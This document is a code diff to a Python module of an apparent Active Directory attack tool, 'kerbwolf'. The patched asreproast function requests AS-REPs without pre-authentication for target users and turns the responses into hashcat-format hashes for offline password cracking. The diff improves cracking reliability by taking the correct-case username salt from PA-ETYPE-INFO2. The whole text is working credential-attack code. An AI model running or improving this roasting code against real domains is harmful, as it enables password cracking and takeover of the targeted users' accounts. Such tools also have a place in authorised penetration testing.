@@ -13,7 +13,7 @@ import logging
 from impacket.krb5.asn1 import AS_REP
 from pyasn1.codec.der import decoder
 
-from kerbwolf.core.asreq import request_asrep_no_preauth
+from kerbwolf.core.asreq import extract_salt_from_asrep, request_asrep_no_preauth
 from kerbwolf.hashcat import asrep_hashcat_mode, format_asrep_hash
 from kerbwolf.models import EncryptionType, HashFormat, KDCError, RoastResult, TransportProtocol
 
@@ -36,9 +36,10 @@ def asreproast(
     trigger a ``KDCError`` which is caught and skipped.  Only accounts
     that return a valid AS-REP produce a hash in the output.
 
-    The *etypes* tuple is sent in the AS-REQ body in the order given,
-    telling the KDC the client's preference.  The KDC picks the first
-    etype the target account supports.
+    The AS-REP padata contains PA-ETYPE-INFO2 with the authoritative
+    salt (correctly-cased ``REALM + sAMAccountName``), even for
+    ``DONT_REQUIRE_PREAUTH`` accounts.  This is used for the hash
+    ``$user$`` field instead of the echoed ``cname``.
     """
     if target_users is None or len(target_users) == 0:
         return []
@@ -58,7 +59,6 @@ def asreproast(
                 timeout=timeout,
             )
         except KDCError:
-            # PREAUTH_REQUIRED, PRINCIPAL_UNKNOWN, etc. - skip.
             _log.debug("Skipped %s (KDC error)", username)
             continue
         except Exception:  # noqa: BLE001
@@ -69,13 +69,24 @@ def asreproast(
         enc_etype = int(decoded["enc-part"]["etype"])
         _log.debug("[%d/%d] %s → AS-REP etype %d", i, len(target_users), username, enc_etype)
         realm = domain.upper()
-        hash_string = format_asrep_hash(raw_asrep, username, realm, fmt=hash_format)
+
+        salt_result = extract_salt_from_asrep(raw_asrep, domain)
+        if salt_result is not None:
+            hash_user, hash_realm = salt_result
+            if hash_user != username:
+                _log.debug("AS-REP salt correction: %s → %s", username, hash_user)
+        else:
+            hash_user, hash_realm = username, realm
+            if enc_etype != EncryptionType.RC4_HMAC:
+                _log.warning("%s: no ETYPE-INFO2 in AS-REP — AES hash may not crack if username casing is wrong", username)
+
+        hash_string = format_asrep_hash(raw_asrep, hash_user, hash_realm, fmt=hash_format)
 
         results.append(
             RoastResult(
-                username=username,
-                realm=realm,
-                spn=f"krbtgt/{realm}",
+                username=hash_user,
+                realm=hash_realm,
+                spn=f"krbtgt/{hash_realm}",
                 etype=enc_etype,
                 hash_string=hash_string,
                 hashcat_mode=asrep_hashcat_mode(enc_etype),
